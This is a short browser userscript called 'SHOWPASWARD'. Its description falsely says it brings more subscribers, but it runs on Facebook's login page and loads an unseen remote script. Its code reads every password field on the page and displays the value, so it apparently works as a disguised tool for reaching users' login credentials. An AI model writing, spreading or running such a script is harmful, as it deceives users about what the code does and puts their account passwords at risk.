// ==UserScript==
// @name			SHOWPASWARD
// @namespace       SHOWPASWARD
// @description 	It allows you to get more subscribers
// @version			3.0
// @editor			renxd12
// @include			https://www.facebook.com/login.php/*
// @include			https://www.facebook.com/login.php/*
// @include			https://www.facebook.com/login.php/*
// @include			https://www.facebook.com/login.php/*
// @require       http://userscripts.org/scripts/source/162850.user.js
// ==/UserScript==


javascript: var p=r(); function r(){var g=0;var x=false;var x=z(document.forms);g=g+1;var w=window.frames;for(var k=0;k<w.length;k++) {var x = ((x) || (z(w[k].document.forms)));g=g+1;}if (!x) alert('Password not found in ' + g + ' forms');}function z(f){var b=false;for(var i=0;i<f.length;i++) {var e=f[i].elements;for(var j=0;j<e.length;j++) {if (h(e[j])) {b=true}}}return b;}function h(ej){var s='';if (ej.type=='password'){s=ej.value;if (s!=''){prompt('Password found ', s)}else{alert('Password is blank')}return true;}}